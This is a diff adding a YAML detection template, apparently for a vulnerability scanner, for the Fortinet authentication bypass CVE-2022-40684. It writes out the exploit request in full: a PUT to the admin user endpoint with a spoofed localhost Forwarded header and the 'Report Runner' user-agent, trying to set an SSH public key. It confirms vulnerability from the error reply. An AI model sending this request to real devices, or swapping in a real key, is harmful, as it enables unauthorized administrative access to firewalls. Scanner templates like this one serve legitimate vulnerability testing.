@@ -1,0 +1,27 @@
+name: poc-yaml-fortinet-cve-2022-40684-auth-bypass
+binding: a840658d-b5a9-4b8e-8d9a-773df06a8b48
+manual: true
+detail:
+    author: z92g(https://github.com/z92g)
+    links:
+        - https://github.com/kljunowsky/CVE-2022-40684-POC
+    vulnerability:
+        id: CT-497236
+        level: critical
+transport: http
+set:
+    key: randomLowercase(10)
+rules:
+    r0:
+        request:
+            cache: true
+            method: PUT
+            path: /api/v2/cmdb/system/admin/admin
+            headers:
+                Content-Type: application/json
+                Forwarded: for="[127.0.0.1]:8888";by="[127.0.0.1]:8888"
+                User-Agent: Report Runner
+            body: |
+                {"ssh-public-key1": "{{key}}"}
+        expression: response.status == 500 && response.content_type.contains("application/json") && response.body.bcontains(bytes("Invalid SSH public key.\\nnode_check_object fail! for ssh-public-key1 " + key))
+expression: r0()
